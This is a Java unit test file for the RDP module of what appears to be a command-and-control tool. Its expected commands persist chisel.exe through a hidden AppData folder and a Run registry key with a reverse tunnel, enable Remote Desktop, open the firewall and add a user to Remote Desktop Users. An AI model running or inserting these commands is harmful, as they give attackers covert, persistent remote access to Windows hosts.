package c2.rdp;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Properties;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import c2.Constants;
import c2.session.CommandLoader;
import c2.session.IOManager;
import c2.session.log.IOLogger;
import util.Time;

class WindowsRDPStandalone {
	
	private class ClientResponseEmulator implements Runnable{

		private IOManager session;
		private int sessionId;
		private boolean alive = true;
		private boolean affirmFileExists;
		private boolean affirmRegKeyHasChisel;
		
		private boolean affirmRemoteAccessEnable = true;
		
		public ClientResponseEmulator(IOManager session, int sessionId, boolean affirmFileExists, boolean affirmRegKeyHasChisel) {
			this.session = session;
			this.sessionId = sessionId;
			this.affirmFileExists = affirmFileExists;
			this.affirmRegKeyHasChisel = affirmRegKeyHasChisel;
		}
		
		public void setAffirmFileExists(boolean affirmFileExists) {
			this.affirmFileExists = affirmFileExists;
		}
		
		public void setAffirmRegKeyHasChisel(boolean affirmRegKeyHasChisel) {
			this.affirmRegKeyHasChisel = affirmRegKeyHasChisel;
		}
		
		public void setAffirmRemoteAccessEnable(boolean affirmRemoteAccessEnable) {
			this.affirmRemoteAccessEnable = affirmRemoteAccessEnable;
		}
		
		public void terminate() {
			alive = false;
		}
		
		public List<String> commands = new ArrayList<>();
		
		@Override
		public void run() {
			while(alive) {
				String command = session.pollCommand(sessionId);
				if(command == null) {
					//continue
					Time.sleepWrapped(10);
				}else {
					if(command.equals("dir %APPDATA%\\nw_helper\\chisel.exe")) {
						if(affirmFileExists) {
							session.sendIO(sessionId, "C:\\>dir chisel.exe\r\n"
									+ " Volume in drive C is OS\r\n"
									+ " Volume Serial Number is AAA2-0F24\r\n"
									+ "\r\n"
									+ " Directory of C:\\\r\n"
									+ "\r\n"
									+ "02/10/2021  12:13 PM             1,187 .viminfo\r\n"
									+ "               1 File(s)          1,187 bytes\r\n"
									+ "               0 Dir(s)  54,514,728,960 bytes free");
						}else {
							session.sendIO(sessionId, "The system cannot find the file specified.");
						}
					}else if(command.equals("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")) {
						String responseChisel = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\r\n";
						if(affirmRegKeyHasChisel) {
							responseChisel += "\r\n 	Chisel    REG_SZ    C:\\Users\\" + System.getProperty("user.name") +"\\AppData\\Roaming\\nw_helper\\chisel.exe client 127.0.0.1:48002 R:48001:127.0.0.1:3389\r\n";
						}
						session.sendIO(sessionId, responseChisel);
					}else if(command.equals("reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"")) {
						session.sendIO(sessionId, RDP_REG_QUERY_NEG_OUT);
					}else if(command.equals("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f")) {
						if(affirmRemoteAccessEnable){
							session.sendIO(sessionId, "The operation completed successfully.");
						}else {
							session.sendIO(sessionId, "ERROR: Access is denied.");
						}
						
					}else if(command.equals("net localgroup \"Remote Desktop Users\"")) {
						session.sendIO(sessionId, NO_USER_RDP_OUT);
					}else if(command.equals("net localgroup \"Remote Desktop Users\" haakerson /add")) {
						session.sendIO(sessionId, "The command completed successfully.");
					}else if(command.equals("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes")) {
						session.sendIO(sessionId, "Updated 6 rule(s).\r\n"
								+ "Ok.");
					}else if(command.startsWith("<LAUNCH> start /b C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Roaming\\nw_helper")) {
						session.sendIO(sessionId, "Process launched");
					}else if(command.startsWith("proxy 127.0.0.1 3389")) {
						session.sendIO(sessionId, PROXY_UP_SUCCESS);
					}
					commands.add(command);
				}
				
			}
			System.out.println("Terminating");
		}
		
	}
	
	public static final String PROXY_UP_SUCCESS = "Proxy established";
	public static final String PROXY_UP_FAILURE = "Cannot connect to specified host";

	public static final String RDP_REG_QUERY_NEG_OUT = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\r\n"
			+ "    AllowRemoteRPC    REG_DWORD    0x0\r\n" + "    DelayConMgrTimeout    REG_DWORD    0x0\r\n"
			+ "    DeleteTempDirsOnExit    REG_DWORD    0x1\r\n" + "    fDenyTSConnections    REG_DWORD    0x1\r\n"
			+ "    fSingleSessionPerUser    REG_DWORD    0x1\r\n" + "    NotificationTimeOut    REG_DWORD    0x0\r\n"
			+ "    PerSessionTempDir    REG_DWORD    0x0\r\n" + "    ProductVersion    REG_SZ    5.1\r\n"
			+ "    RCDependentServices    REG_MULTI_SZ    CertPropSvc\\0SessionEnv\r\n"
			+ "    SnapshotMonitors    REG_SZ    1\r\n" + "    StartRCM    REG_DWORD    0x0\r\n"
			+ "    TSUserEnabled    REG_DWORD    0x0\r\n" + "    RailShowallNotifyIcons    REG_DWORD    0x1\r\n"
			+ "    RDPVGCInstalled    REG_DWORD    0x1\r\n"
			+ "    InstanceID    REG_SZ    f72b69d4-53cd-4a4b-9136-2bc8133\r\n"
			+ "    GlassSessionId    REG_DWORD    0x2";

	public static final String RDP_REG_QUERY_POS_OUT = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\r\n"
			+ "    AllowRemoteRPC    REG_DWORD    0x0\r\n" + "    DelayConMgrTimeout    REG_DWORD    0x0\r\n"
			+ "    DeleteTempDirsOnExit    REG_DWORD    0x1\r\n" + "    fDenyTSConnections    REG_DWORD    0x0\r\n"
			+ "    fSingleSessionPerUser    REG_DWORD    0x1\r\n" + "    NotificationTimeOut    REG_DWORD    0x0\r\n"
			+ "    PerSessionTempDir    REG_DWORD    0x0\r\n" + "    ProductVersion    REG_SZ    5.1\r\n"
			+ "    RCDependentServices    REG_MULTI_SZ    CertPropSvc\\0SessionEnv\r\n"
			+ "    SnapshotMonitors    REG_SZ    1\r\n" + "    StartRCM    REG_DWORD    0x0\r\n"
			+ "    TSUserEnabled    REG_DWORD    0x0\r\n" + "    RailShowallNotifyIcons    REG_DWORD    0x1\r\n"
			+ "    RDPVGCInstalled    REG_DWORD    0x1\r\n"
			+ "    InstanceID    REG_SZ    f72b69d4-53cd-4a4b-9136-2bc8133\r\n"
			+ "    GlassSessionId    REG_DWORD    0x2";

	public static final String NO_USER_RDP_OUT = "C:\\WINDOWS\\system32>net localgroup \"Remote Desktop Users\"\r\n"
			+ "Alias name     Remote Desktop Users\r\n"
			+ "Comment        Members in this group are granted the right to logon remotely\r\n" + "\r\n"
			+ "Members\r\n" + "\r\n"
			+ "-------------------------------------------------------------------------------\r\n"
			+ "The command completed successfully.";

	public static final String AFFIRM_USER_RDP_OUT = "C:\\WINDOWS\\system32>net localgroup \"Remote Desktop Users\"\r\n"
			+ "Alias name     Remote Desktop Users\r\n"
			+ "Comment        Members in this group are granted the right to logon remotely\r\n" + "\r\n"
			+ "Members\r\n" + "\r\n"
			+ "-------------------------------------------------------------------------------\r\n" + "haxor\r\n"
			+ "The command completed successfully.";

	public static final String CORRECT_CLIENT_CHISEL_QUERY = "REGENERATE THIS IF I EVER USE CHISEL AGAIN";

	public static final String NET_USER_SUCCESS = "The command completed successfully.";

	IOManager io;
	int sessionId;

	@BeforeEach
	void setUp() throws Exception {
		Path path = Paths.get("config", "test.properties");
		try (InputStream input = new FileInputStream(path.toFile())) {

			Properties prop = new Properties();

			// load a properties file
			prop.load(input);

			CommandLoader cl = new CommandLoader(new HashMap<>(), new HashMap<>(), new ArrayList<>());
			io = new IOManager(new IOLogger(Paths.get(prop.getProperty(Constants.HUBLOGGINGPATH))), cl);

			sessionId = io.determineAndGetCorrectSessionId("fake", "fake", "fake", false, null);
		} catch (IOException ex) {
			System.out.println("Unable to load config file");
		}
	}

	@AfterEach
	void tearDown() throws Exception {
	}

	@Test
	void testLoadConfiguration() {
		assertEquals(WindowsRDPManager.CHISEL_EXE, "chisel.exe");
		assertEquals(WindowsRDPManager.CLIENT_CHISEL_DIR, "%APPDATA%\\nw_helper");
		assertEquals(WindowsRDPManager.CHISEL_WIN_BIN, "binaries\\chisel.exe");
		assertEquals(WindowsRDPManager.SERVER_IP, "127.0.0.1");
		assertEquals(WindowsRDPManager.PERSIST_REG_KEY, "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
		assertEquals(WindowsRDPManager.RDP_ENABLE_REG_KEY,
				"\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"");
		assertEquals(WindowsRDPManager.LOCAL_CHISEL_EXEC, "binaries\\chisel.exe");
	}

	void testValidateClientsideChiselDeployed() {
		int id = io.determineAndGetCorrectSessionId("fake", "fake", "fake", false, null);
		
		//Flush the command buffer
		String cmd = io.pollCommand(id);
		while(cmd != null) {
			cmd = io.pollCommand(id);
		}
		
		ExecutorService exec = Executors.newFixedThreadPool(2);
		ClientResponseEmulator em = new ClientResponseEmulator(io, id, false, false);
		exec.submit(em);
		
		Time.sleepWrapped(1000);
		RDPSessionInfo info = new RDPSessionInfo("user:host", 48001, 48002);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		
		//This will cause the check for an installed binary to fail and return false.
		assertFalse(rdp.validateClientsideChiselBinaryDeployed(id, info));
		
		//Test it returning else, which leads to...
		em.setAffirmFileExists(true);
		assertTrue(rdp.validateClientsideChiselBinaryDeployed(id, info));
		
		//Test if the reg key is set correctly
		assertFalse(rdp.validateClientsideChiselRegistryDeployed(id, info));
		em.setAffirmRegKeyHasChisel(true);
		assertTrue(rdp.validateClientsideChiselRegistryDeployed(id, info));

	}

	void testInstallClientsideChisel() {
		RDPSessionInfo info = new RDPSessionInfo("narf", 48001, 48002);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		try {
			//Assume both reg key and binary need installation
			rdp.installClientsideChisel(sessionId, info, true, true);
		} catch (Exception e) {
			e.printStackTrace();
			fail();

		}
		String firstCommand = io.pollCommand(sessionId);
		assertEquals(firstCommand, "mkdir %APPDATA%\\nw_helper");
		String secondCommand = io.pollCommand(sessionId);
		assertTrue(secondCommand.startsWith("<control> download %APPDATA%\\nw_helper\\chisel.exe  "));
		String thirdCommand = io.pollCommand(sessionId); 
		assertEquals(thirdCommand, "reg delete HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Chisel /f");
		String fourthCommand = io.pollCommand(sessionId);
		assertTrue(fourthCommand.equals("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Chisel /t REG_SZ /d \"%APPDATA%\\nw_helper\\chisel.exe client 127.0.0.1:48002 R:48001:127.0.0.1:3389\""));
	}

	

	@Test
	void testValidateClientRDPEnabled() {
		// Test when true
		io.sendIO(sessionId, RDP_REG_QUERY_POS_OUT);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		assertTrue(rdp.validateClientRDPEnabled(sessionId));

		// Test when false
		io.sendIO(sessionId, RDP_REG_QUERY_NEG_OUT);
		rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		assertFalse(rdp.validateClientRDPEnabled(sessionId));

		// Flush commands
		String out = io.pollCommand(sessionId);
		assertEquals(out, "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"");
		out = io.pollCommand(sessionId);
		assertEquals(out, "reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"");
	}

	@Test
	void testValidateUserInRDPGroup() {
		// Test when true
		io.sendIO(sessionId, AFFIRM_USER_RDP_OUT);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		assertTrue(rdp.validateUserInRDPGroup(sessionId, "haxor"));

		// Test when false
		io.sendIO(sessionId, NO_USER_RDP_OUT);
		rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		assertFalse(rdp.validateUserInRDPGroup(sessionId, "haxor"));

		// Flush commands
		String out = io.pollCommand(sessionId);
		assertEquals(out, "net localgroup \"Remote Desktop Users\"");
		out = io.pollCommand(sessionId);
		assertEquals(out, "net localgroup \"Remote Desktop Users\"");
	}

	@Test
	void testAddUserToRDPGroup() {
		// Test when true
		io.sendIO(sessionId, NET_USER_SUCCESS);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		try {
			rdp.addUserToRDPGroup(sessionId, "haxor");
		} catch (Exception e) {
			fail(e);
		}

		// Test when false
		io.sendIO(sessionId, "Access is denied.");
		try {
			rdp.addUserToRDPGroup(sessionId, "haxor");
			fail("Failure to add user should be fatal");
		} catch (Exception e) {
			assertEquals(e.getMessage(), "Could not add user haxor to 'Remote Desktop Users': Access is denied.");
		}

		// Flush commands
		String out = io.pollCommand(sessionId);
		assertEquals(out, "net localgroup \"Remote Desktop Users\" haxor /add");
		out = io.pollCommand(sessionId);
		assertEquals(out, "net localgroup \"Remote Desktop Users\" haxor /add");
	}

	@Test 
	void testStartProxy(){
		//Test positive case
		io.sendIO(sessionId, PROXY_UP_SUCCESS);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		RDPSessionInfo info = new RDPSessionInfo("narf", 48001, 48002);
		assertTrue(rdp.startNewProxy(info, sessionId));
		String cmd = io.pollCommand(sessionId);
		assertEquals("proxy 127.0.0.1 3389 " + info.localForwardPort, cmd);
		
		//Test negative case
		io.sendIO(sessionId, PROXY_UP_FAILURE);
		assertFalse(rdp.startNewProxy(info, sessionId));
		cmd = io.pollCommand(sessionId);
		assertEquals("proxy 127.0.0.1 3389 " + info.localForwardPort, cmd);
	}
	
	@Test
	void testEnableRDP() {
		int id = io.determineAndGetCorrectSessionId("fake", "fake", "fake", false, null);
		ExecutorService exec = Executors.newFixedThreadPool(2);
		ClientResponseEmulator em = new ClientResponseEmulator(io, id, true, true);
		exec.submit(em);
		
		Time.sleepWrapped(1000);
		
		// Test when true
		System.out.println("Testing RDP");
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		try {
			rdp.enableRDP(id);
		} catch (Exception e) {
			System.out.println(e.getMessage());
			fail(e);
		}

		// Test when false
		em.setAffirmRemoteAccessEnable(false);
		try {
			rdp.enableRDP(id);
			fail("Failure to enable RDP should be fatal");
		} catch (Exception e) {
			assertEquals(e.getMessage(), "Could not Enable Remote Desktop: ERROR: Access is denied.");
		}
	}

	void testValidateClientsideChiselRunning() {
		String expectedCmd = "powershell -c \"Get-WmiObject Win32_Process -Filter \"\"name = 'chisel.exe'\"\"\"";

		io.sendIO(sessionId, CORRECT_CLIENT_CHISEL_QUERY);
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		RDPSessionInfo info = new RDPSessionInfo("barf", 8001, 8000);
		assertTrue(rdp.validateClientsideChiselRunning(sessionId, info));

		// Test failed query
		io.sendIO(sessionId, "");
		assertFalse(rdp.validateClientsideChiselRunning(sessionId, info));

		// Flush commands
		String out = io.pollCommand(sessionId);
		assertEquals(out, expectedCmd);
		out = io.pollCommand(sessionId);
		assertEquals(out, expectedCmd);
	}
	
	void testServersideChiselStart() {
		int id = io.determineAndGetCorrectSessionId("fake", "fake", "fake", false, null);
		
		ExecutorService exec = Executors.newFixedThreadPool(2);
		ClientResponseEmulator em = new ClientResponseEmulator(io, id, true, true);
		exec.submit(em);
		
		Time.sleepWrapped(1000);
		
		WindowsRDPManager rdp = new WindowsRDPManager(io, 48000, 10, io.getCommandPreprocessor());
		try {
			rdp.startup();
		} catch (Exception e) {
			fail(e.getMessage());
			e.printStackTrace();
		}
		RDPSessionInfo info = rdp.executeRDPSetup("user:host", "haakerson");
		
		if(info.hasErrors()) {
			for(String error : info.getErrors()) {
				fail(error);
			}
		}
		
		String report = io.pollIO(id);
		assertTrue(report.contains("Starting local listener - Local Incoming: 48000 Remote forward: 48001"));
		assertTrue(report.contains("Client binary in place? true"));
		assertTrue(report.contains("Client regkey in place? false"));
		assertTrue(report.contains("Validation failed, starting chisel running on client"));
		assertTrue(report.contains("Client elevated? true"));
		
		try {
			Path rdpFile = Paths.get("rdp_persist");
			List<String> lines = Files.readAllLines(rdpFile);
			assertEquals(lines.size(), 3);
			assertEquals(lines.get(0), "Client Session ID: user:host");
			assertEquals(lines.get(1), "Server forward port: 48001");
			assertEquals(lines.get(2), "Server incoming port: 48000");
			Files.writeString(rdpFile, "//The server will write RDP configuration here.");
		} catch (IOException e) {
			fail("Cannot verify RDP persistence config: " + e.getMessage());
		}
		
		
		//Test that we really started chisel
		assertTrue(rdp.validateServersideChisel(info));
		
		em.terminate();
		rdp.teardown();
		
		//Wait for emulator to stop
		Time.sleepWrapped(1000);
		
		assertFalse(rdp.validateServersideChisel(info));
	}

}
